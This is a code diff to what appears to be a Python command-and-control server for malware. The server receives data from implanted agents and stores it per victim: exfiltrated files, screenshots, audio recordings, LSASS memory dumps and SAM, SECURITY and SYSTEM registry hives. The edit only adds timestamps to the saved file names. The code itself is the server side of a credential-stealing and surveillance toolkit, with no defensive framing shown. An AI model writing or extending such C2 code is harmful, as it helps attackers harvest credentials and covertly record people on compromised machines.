@@ -41,9 +41,10 @@ class C2(BaseHTTPRequestHandler):
             return "intruder"
 
     def parse_agent_data(self, agent_data):
+
         command_type = agent_data['command_type']
         agent = self.headers["user-agent"]
-
+        file_save_strftime = "%d.%m.%Y_%H.%M.%S"
         if command_type == "download" and agent_data["data"]["is_success"] == "true":
             save_path = os.path.join(collect_folder, agent, ntpath.basename(agent_data["data"]["file_path"]))
             if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"], encoding="utf-8")):
@@ -53,26 +54,27 @@ class C2(BaseHTTPRequestHandler):
 
         elif command_type == "screenshot" and agent_data["data"]["is_success"] == "true":
             save_path = os.path.join(
-                collect_folder, agent, "screenshot_{}.png".format(datetime.now().strftime("%d%m%Y_%H%M%S")))
+                collect_folder, agent, "screenshot_{}.png".format(datetime.now().strftime(file_save_strftime)))
             if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["screenshot_base64"])):
                 utils.log_message(f"Downloaded screenshot from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
         elif command_type == "lsass" and agent_data["data"]["is_success"] == "true":
-            save_path = os.path.join(collect_folder, agent, "lsass.dmp")
+            save_path = os.path.join(collect_folder, agent, "lsass_{}.dmp".format(datetime.now().strftime(
+                file_save_strftime)))
             if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"])):
                 utils.log_message(f"Downloaded lsass dump from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
         elif command_type == "audio" and agent_data["data"]["is_success"] == "true":
-            save_path = os.path.join(collect_folder, agent, "record.wav")
+            save_path = os.path.join(collect_folder, agent, "record_{}.wav".format(datetime.now().strftime(
+                file_save_strftime)))
             if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"])):
                 utils.log_message(f"Downloaded audio recording from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
-
         elif command_type == "sam" and agent_data["data"]["is_success"] == "true":
-            save_path = os.path.join(collect_folder, agent, "sam")
+            save_path = os.path.join(collect_folder, agent, "sam_{}".format(datetime.now().strftime(file_save_strftime)))
             sam_path = os.path.join(save_path, "sam")
             sec_path = os.path.join(save_path, "security")
             sys_path = os.path.join(save_path, "system")
